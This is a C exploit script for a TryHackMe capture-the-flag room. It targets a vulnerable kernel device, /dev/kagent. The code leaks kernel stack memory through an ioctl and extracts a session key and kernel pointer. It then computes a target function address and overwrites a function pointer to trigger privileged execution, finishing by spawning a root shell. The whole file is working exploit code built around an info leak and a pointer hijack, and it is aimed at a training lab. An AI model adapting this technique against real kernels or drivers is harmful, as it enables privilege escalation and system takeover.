 /* =========================================
 Script by Gemini and Claudi AI
 Leaking key hint by Jaxafed https://jaxafed.github.io/posts/tryhackme-aoc2025_sidequest_two/
 script for tryhackme room Scheme Catcher https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R
 YouTube video walk through: https://youtu.be/x_s0IofEiAQ

    ========================================= */


#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>

#define CMD_GET_STATUS  0xc0b33701
#define CMD_LOAD_VAL    0x40933702
#define CMD_EXECUTE     0x133703

int main(int argc, char **argv) {
    printf("[*] Starting Dynamic Zero-Knowledge Exploit...\n");

    int fd = open("/dev/kagent", O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    /* =========================================
       STEP 1: LEAK (Send 'A's)
       ========================================= */
    uint8_t buf[512];
    memset(buf, 'A', 16);      
    memset(buf + 16, 0, 496); 
    
    printf("[*] Sending Heartbeat to leak stack...\n");
    if (ioctl(fd, CMD_GET_STATUS, buf) < 0) { perror("ioctl leak"); return 1; }

    /* =========================================
       STEP 2: SCAN & CALCULATE
       ========================================= */
    uint64_t leak_ptr = 0;
    int ptr_offset = -1;

    // Scan for kernel pointer signature (0xffffffff........)
    for (int i = 0; i < 400; i++) {
        uint64_t val = *(uint64_t*)(buf + i);
        if ((val & 0xffffffff00000000) == 0xffffffff00000000 && val != 0xffffffffffffffff) {
            leak_ptr = val;
            ptr_offset = i;
            printf("[+] Found Kernel Pointer at offset %d: 0x%lx\n", i, val);
            break;
        }
    }

    if (ptr_offset == -1) {
        printf("[-] Could not find kernel pointer.\n");
        return 1;
    }

    // CRITICAL FIX: The Key is the 16 bytes BEFORE the pointer
    int key_offset = ptr_offset - 16;
    if (key_offset < 0) {
        printf("[-] Pointer found too early, cannot read key before it.\n");
        return 1;
    }

    char session_key[16];
    memcpy(session_key, buf + key_offset, 16);

    printf("[+] Extracted Session Key from offset %d: ", key_offset);
    for(int i=0; i<16; i++) printf("%02x", (unsigned char)session_key[i]);
    printf("\n");
    
    // Also try to print it as string if it looks printable
    char key_str[17] = {0};
    memcpy(key_str, session_key, 16);
    printf("[+] Key as String: '%s'\n", key_str);

    /* =========================================
       STEP 3: CALC TARGET
       ========================================= */
    // leak_ptr is 'op_ping'. 
    // Target 'op_execute' is +0x330 (based on your previous findings) or +0x320 (from Python script)
    // The Python script used 0x320, but your C analysis said 0x330.
    // Let's use the offset derived from the module base 0xffffffffc0...000
    
    uint64_t module_base = leak_ptr & 0xfffffffffffff000;
    // Usually op_ping is at base+0x10. So leak_ptr = base+0x10.
    // op_execute is usually base+0x330.
    // So target = leak_ptr - 0x10 + 0x330 = leak_ptr + 0x320.
    
    uint64_t op_execute = leak_ptr + 0x320; 
    printf("[+] Calculated op_execute: 0x%lx\n", op_execute);

    /* =========================================
       STEP 4: SEND PAYLOAD (Offset 48)
       ========================================= */
    uint8_t payload[256];
    memset(payload, 0, sizeof(payload));

    // 1. Session Key (Offset 0)
    memcpy(payload, session_key, 16);

    // 2. Padding (AgentID + NewKey) = 32 bytes
    memset(payload + 16, 'B', 32);

    // 3. Target Pointer at Offset 48 (16 + 16 + 16)
    *(uint64_t*)(payload + 48) = op_execute;

    printf("[*] Sending Payload (Key + Target @ 48)...\n");
    if (ioctl(fd, CMD_LOAD_VAL, payload) < 0) {
        perror("[-] Load Failed");
        // Fallback: Try Offset 0x330 calculation if 0x320 was wrong
        printf("[!] Retrying with +0x330 offset...\n");
        *(uint64_t*)(payload + 48) = leak_ptr + 0x330; 
        if(ioctl(fd, CMD_LOAD_VAL, payload) < 0) {
             perror("[-] Retry Failed");
             return 1;
        }
    }

    printf("[+] Payload Loaded. Triggering...\n");
    ioctl(fd, CMD_EXECUTE, 0);

    printf("[*] Spawning Shell (Check UID)...\n");
    system("id");
    system("/bin/sh");

    return 0;
}
